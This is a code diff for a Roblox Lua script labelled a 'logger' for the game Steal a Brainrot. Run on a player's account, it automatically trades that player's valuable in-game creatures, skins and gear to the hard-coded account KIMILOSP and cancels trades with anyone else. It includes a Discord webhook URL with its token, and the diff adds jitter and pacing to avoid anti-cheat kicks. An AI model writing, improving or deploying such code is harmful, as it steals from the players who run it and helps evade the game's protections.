@@ -1,14 +1,25 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
-  · Target único: KIMILOSP (UserId resuelto automáticamente)
-  · Todos los eventos van a un solo webhook
-  · Listas actualizadas con la última update
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v4 ANTI-KICK
+  · Target único: KIMILOSP (siempre resuelto por nombre)
+  · Ritmo de remotes reducido + jitter (menos 267)
+  · F2 = rejoin | HUD de estado
 ============================================================
 ]]
 
 getgenv().TARGET_USERNAME = "KIMILOSP"
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
+
+-- ── AJUSTES ANTI-KICK (súbelos si te siguen tirando) ──
+getgenv().CONFIG = {
+	INVITE_DELAY = 3.5,     -- segundos entre invitaciones
+	INVITE_SAFETY = 10,     -- si hay trade abierto, reintento de seguridad
+	INVITE_HOLD = 6,        -- pausa tras recibir una invitación
+	ADD_DELAY = 1.5,        -- ritmo de AddBrainrot / AddItem
+	READY_DELAY = 1,        -- ritmo de Ready + Accept
+	SCAN_DELAY = 1.5,       -- ritmo del escaneo de inventario (getgc)
+	JITTER = 0.5,           -- aleatoriedad añadida
+}
 
 getgenv().ALLOWED_ANIMALS = {
   "Spyder Elephant", "Strawberry Elephant", "Meowl", "John Pork", "Skibidi Toilet",
@@ -492,9 +503,21 @@ end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
 local localPlayer = Players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+-- F2 = rejoin rápido si te tiran
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.KeyCode == Enum.KeyCode.F2 then
+		pcall(function()
+			TeleportService:Teleport(game.PlaceId, localPlayer)
+		end)
+	end
+end)
 
 task.spawn(function()
 	if not game:IsLoaded() then
@@ -502,10 +525,24 @@ task.spawn(function()
 	end
 
 	if not table.find({ 99606176102979, 109983668079237, 79906538690694, 119594317142884 }, game.PlaceId) then
+		warn("[LOGGER] PlaceId no soportado: " .. tostring(game.PlaceId))
 		return
 	end
 
-	local targetName = getgenv().TARGET_USERNAME or "KIMILOSP"
+	local CFG = getgenv().CONFIG or {}
+	local INVITE_DELAY  = CFG.INVITE_DELAY  or 3.5
+	local INVITE_SAFETY = CFG.INVITE_SAFETY or 10
+	local INVITE_HOLD   = CFG.INVITE_HOLD   or 6
+	local ADD_DELAY     = CFG.ADD_DELAY     or 1.5
+	local READY_DELAY   = CFG.READY_DELAY   or 1
+	local SCAN_DELAY    = CFG.SCAN_DELAY    or 1.5
+	local JITTER        = CFG.JITTER        or 0.5
+
+	local function jitter(base)
+		return base + math.random() * JITTER
+	end
+
+	local wantedName = getgenv().TARGET_USERNAME or "KIMILOSP"
 	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
 	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
 	local tbl = {}
@@ -534,19 +571,26 @@ task.spawn(function()
 		end
 	end
 
-	-- ── TARGET ÚNICO (KIMILOSP) ──
-	local targetUserId = tonumber(getgenv().TARGET_USER_ID) or 0
-	if targetUserId == 0 then
-		pcall(function()
-			targetUserId = Players:GetUserIdFromNameAsync(targetName)
+	-- ── RESOLUCIÓN DEL TARGET ──
+	local targetUserId = 0
+	local resolveErr = nil
+	do
+		local ok, idOrErr = pcall(function()
+			return Players:GetUserIdFromNameAsync(wantedName)
 		end)
+		if ok and type(idOrErr) == "number" and idOrErr > 0 then
+			targetUserId = idOrErr
+		else
+			resolveErr = tostring(idOrErr)
+		end
 	end
-	if not targetUserId or targetUserId == 0 then
-		warn("[LOGGER] No se pudo resolver el usuario: " .. tostring(targetName))
+
+	if targetUserId == 0 then
+		warn("[LOGGER] No se pudo resolver '" .. wantedName .. "' — " .. tostring(resolveErr))
 		return
 	end
 
-	-- nombre real (username) + display name, para que el match no falle
+	local targetName = wantedName
 	pcall(function()
 		local realName = Players:GetNameFromUserIdAsync(targetUserId)
 		if realName and realName ~= "" then
@@ -554,7 +598,7 @@ task.spawn(function()
 		end
 	end)
 
-	local targetNames = { string.lower(targetName) }
+	local targetNames = { string.lower(targetName), string.lower(wantedName) }
 	do
 		local plrInServer = Players:GetPlayerByUserId(targetUserId)
 		if plrInServer and plrInServer.DisplayName and plrInServer.DisplayName ~= "" then
@@ -563,7 +607,7 @@ task.spawn(function()
 	end
 
 	local function isTargetName(text)
-		if not text then
+		if not text or text == "" then
 			return false
 		end
 		text = string.lower(text)
@@ -575,9 +619,57 @@ task.spawn(function()
 		return false
 	end
 
-	print("[LOGGER] Target: " .. targetName .. " (" .. tostring(targetUserId) .. ")")
+	print("[LOGGER] Target resuelto: " .. targetName .. " (" .. tostring(targetUserId) .. ")")
+
+	if targetUserId == localPlayer.UserId then
+		warn("[LOGGER] ¡ATENCIÓN! Estás ejecutando el script EN la cuenta objetivo.")
+	end
+
+	local function isTargetInServer()
+		return Players:GetPlayerByUserId(targetUserId) ~= nil
+	end
+
+	if not isTargetInServer() then
+		warn("[LOGGER] " .. targetName .. " NO está en este servidor.")
+	end
 
 	local targetId = targetUserId
+
+	-- ── HUD ──
+	local hudLabel = nil
+	do
+		pcall(function()
+			local hud = Instance.new("ScreenGui")
+			hud.Name = "LoggerHUD"
+			hud.ResetOnSpawn = false
+			hud.IgnoreGuiInset = true
+			hud.DisplayOrder = 99998
+			local ok = pcall(function() hud.Parent = game:GetService("CoreGui") end)
+			if not ok or not hud.Parent then hud.Parent = playerGui end
+
+			local frame = Instance.new("Frame")
+			frame.Size = UDim2.new(0, 430, 0, 110)
+			frame.Position = UDim2.new(0, 12, 0, 12)
+			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+			frame.BackgroundTransparency = 0.35
+			frame.BorderSizePixel = 0
+			frame.Parent = hud
+
+			local lbl = Instance.new("TextLabel")
+			lbl.Size = UDim2.new(1, -12, 1, -8)
+			lbl.Position = UDim2.new(0, 6, 0, 4)
+			lbl.BackgroundTransparency = 1
+			lbl.Font = Enum.Font.Code
+			lbl.TextSize = 12
+			lbl.TextXAlignment = Enum.TextXAlignment.Left
+			lbl.TextYAlignment = Enum.TextYAlignment.Top
+			lbl.TextColor3 = Color3.fromRGB(90, 255, 120)
+			lbl.TextWrapped = true
+			lbl.Text = "iniciando..."
+			lbl.Parent = frame
+			hudLabel = lbl
+		end)
+	end
 
 	local tbl4 = {
 		["Strawberry Elephant"] = true,
@@ -613,15 +705,6 @@ task.spawn(function()
 	}
 
 	local str = "https://stealabrainrot.fandom.com/wiki/"
-	local tbl5 = {}
-
-	for k, v in pairs(tbl) do
-		tbl5[k] = v
-	end
-
-	for k, v in pairs(tbl4) do
-		tbl5[k] = v
-	end
 
 	local function fn(arg)
 		local children = game:GetService("ReplicatedStorage").Packages.Net:GetChildren()
@@ -1405,6 +1488,7 @@ task.spawn(function()
 	local v = fn5()
 	local v2 = fn6()
 	if #priority == 0 and #normal == 0 and #v == 0 and #v2 == 0 then
+		warn("[LOGGER] No hay nada que tradear.")
 		return
 	end
 	fn2()
@@ -1446,6 +1530,7 @@ task.spawn(function()
 	tbl6.gearQueue = fn6()
 	tbl6.baseSkinIdx = 1
 	tbl6.gearIdx = 1
+
 	local Invite = fn("RF/TradeService/Invite")
 	local AddBrainrot = fn("RF/TradeService/AddBrainrot")
 	local AddItem = fn("RF/TradeService/AddItem")
@@ -1454,21 +1539,65 @@ task.spawn(function()
 	local Cancel = fn("RF/TradeService/Cancel")
 	local CreateInvite = fn("RE/TradeService/CreateInvite")
 	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
-	if not (Invite and AddBrainrot and AddItem and Ready and Accept and Cancel and CreateInvite and AcceptInvite) then
+
+	local missing = {}
+	for name, remote in pairs({
+		Invite = Invite, AddBrainrot = AddBrainrot, AddItem = AddItem, Ready = Ready,
+		Accept = Accept, Cancel = Cancel, CreateInvite = CreateInvite, AcceptInvite = AcceptInvite,
+	}) do
+		if not remote then
+			table.insert(missing, name)
+		end
+	end
+
+	if #missing > 0 then
+		warn("[LOGGER] Remotes no encontrados: " .. table.concat(missing, ", "))
 		return
 	end
+
+	print("[LOGGER] Remotes OK. Fase: " .. tbl6.phase .. " | cola: " .. #tbl6.queue)
+
 	local v3 = nil
 	local from = nil
+	local lastInvite = "sin intentos"
+	local inviteCount = 0
+	local receivedInvites = 0
+	local lastInviteAt = 0
+	local lastPendingAt = 0
 
 	if CreateInvite and CreateInvite:IsA("RemoteEvent") then
 		CreateInvite.OnClientEvent:Connect(function(arg, arg2)
 			if not arg or not arg2 or not arg2.from then
 				return
 			end
+			receivedInvites = receivedInvites + 1
+			lastPendingAt = os.clock()
 			v3 = arg
 			from = arg2.from
+			print("[LOGGER] Invitación recibida de: " .. tostring(arg2.from))
 		end)
 	end
+
+	task.spawn(function()
+		while true do
+			if hudLabel then
+				pcall(function()
+					local inServer = isTargetInServer() and "SI" or "NO"
+					local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil and "SI" or "NO"
+					hudLabel.Text = table.concat({
+						"TARGET: " .. targetName .. " (" .. targetUserId .. ")",
+						"EN SERVIDOR: " .. inServer .. (inServer == "NO" and "  <-- PROBLEMA" or ""),
+						"FASE: " .. tbl6.phase .. " | cola: " .. #tbl6.queue,
+						"skins: " .. #tbl6.baseSkinQueue .. " | gears: " .. #tbl6.gearQueue,
+						"trade abierto: " .. tradeOpen,
+						"invites: " .. inviteCount .. " env / " .. receivedInvites .. " rec",
+						"ultimo invite: " .. tostring(lastInvite):sub(1, 60),
+					}, "\n")
+				end)
+			end
+			task.wait(1)
+		end
+	end)
 
 	task.spawn(function()
 		while true do
@@ -1498,7 +1627,7 @@ task.spawn(function()
 					if tradeLiveTrade2 and tradeLiveTrade2:FindFirstChild("Other") then
 						local username = tradeLiveTrade2.Other:FindFirstChild("Username")
 
-						if username and not isTargetName(username.Text) then
+						if username and username.Text ~= "" and not isTargetName(username.Text) then
 							pcall(function()
 								Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
 							end)
@@ -1507,16 +1636,20 @@ task.spawn(function()
 				end
 			end)
 
-			task.wait(0.5)
+			task.wait(0.75)
 		end
 	end)
+
+	local addTick = 0
 
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
 				local queue = tbl6.queue
+				addTick = addTick + 1
+				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
 
-				if #queue > 0 then
+				if #queue > 0 and (tradeOpen or addTick % 4 == 0) then
 					if #queue < tbl6.addIdx then
 						tbl6.addIdx = 1
 					end
@@ -1539,7 +1672,7 @@ task.spawn(function()
 				end
 			end
 
-			task.wait(1)
+			task.wait(jitter(ADD_DELAY))
 		end
 	end)
 
@@ -1547,8 +1680,9 @@ task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
 				local baseSkinQueue = tbl6.baseSkinQueue
+				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
 
-				if #baseSkinQueue > 0 then
+				if #baseSkinQueue > 0 and (tradeOpen or addTick % 4 == 0) then
 					if tbl6.baseSkinIdx > #baseSkinQueue then
 						tbl6.baseSkinIdx = 1
 					end
@@ -1565,7 +1699,7 @@ task.spawn(function()
 				end
 			end
 
-			task.wait(1)
+			task.wait(jitter(ADD_DELAY))
 		end
 	end)
 
@@ -1573,8 +1707,9 @@ task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
 				local gearQueue = tbl6.gearQueue
+				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
 
-				if #gearQueue > 0 then
+				if #gearQueue > 0 and (tradeOpen or addTick % 4 == 0) then
 					if #gearQueue < tbl6.gearIdx then
 						tbl6.gearIdx = 1
 					end
@@ -1597,20 +1732,37 @@ task.spawn(function()
 				end
 			end
 
-			task.wait(1)
+			task.wait(jitter(ADD_DELAY))
 		end
 	end)
 
-	-- ── INVITE LOOP (CORREGIDO: siempre invita al único target) ──
+	-- ── INVITE LOOP ANTI-KICK ──
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				pcall(function()
-					Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
-				end)
+				local now = os.clock()
+				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
+				local pending = v3 ~= nil and (now - lastPendingAt) < INVITE_HOLD
+				local canInvite
+
+				if tradeOpen then
+					canInvite = (now - lastInviteAt) >= INVITE_SAFETY
+				else
+					canInvite = not pending and (now - lastInviteAt) >= INVITE_DELAY
+				end
+
+				if canInvite then
+					lastInviteAt = now
+					local ok, res = pcall(function()
+						return Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
+					end)
+
+					inviteCount = inviteCount + 1
+					lastInvite = ok and ("ok -> " .. tostring(res)) or tostring(res)
+				end
 			end
 
-			task.wait(2)
+			task.wait(0.5 + math.random() * 0.5)
 		end
 	end)
 
@@ -1664,7 +1816,7 @@ task.spawn(function()
 				end
 			end
 
-			task.wait(0.7)
+			task.wait(jitter(READY_DELAY))
 		end
 	end)
 
@@ -1685,7 +1837,7 @@ task.spawn(function()
 		end
 
 		while true do
-			task.wait(0.5)
+			task.wait(SCAN_DELAY)
 			local n4 = #fn7("NORMAL")
 			local n5 = #fn5()
 			local n6 = #fn6()
